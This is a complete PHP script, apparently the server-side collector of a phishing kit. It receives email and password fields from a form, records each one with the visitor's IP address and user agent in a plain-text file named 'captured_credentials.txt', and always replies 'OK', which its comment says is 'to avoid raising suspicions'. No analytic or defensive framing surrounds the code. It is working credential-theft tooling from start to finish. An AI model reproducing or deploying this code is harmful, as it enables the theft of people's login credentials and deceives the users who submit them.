<?php
// silent_logger.php - Silent file logging without any response
header('Content-Type: text/plain');

// Get posted data
$email = $_POST['email'] ?? 'N/A';
$password = $_POST['password'] ?? 'N/A';
$timestamp = $_POST['timestamp'] ?? date('Y-m-d H:i:s');
$ip_address = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';

// Sanitize data
$email = htmlspecialchars($email);
$password = htmlspecialchars($password);

// Create log entry
$log_entry = "[" . date('Y-m-d H:i:s') . "] IP: {$ip_address} | Email: {$email} | Password: {$password} | UserAgent: {$user_agent}\n";

// Define log file path (adjust as needed)
$log_file = 'captured_credentials.txt';

// Append to log file silently
if (file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX)) {
    // Success - no output to user
    echo "OK";
} else {
    // Still no output to user, just log error server-side
    error_log("Failed to write to credentials log file");
    echo "OK"; // Always return OK to avoid raising suspicions
}

// Optional: Also log to a separate secure location
//$secure_log = '/var/log/credentials.log'; // Adjust path for your server
//@file_put_contents($secure_log, $log_entry, FILE_APPEND | LOCK_EX);
?>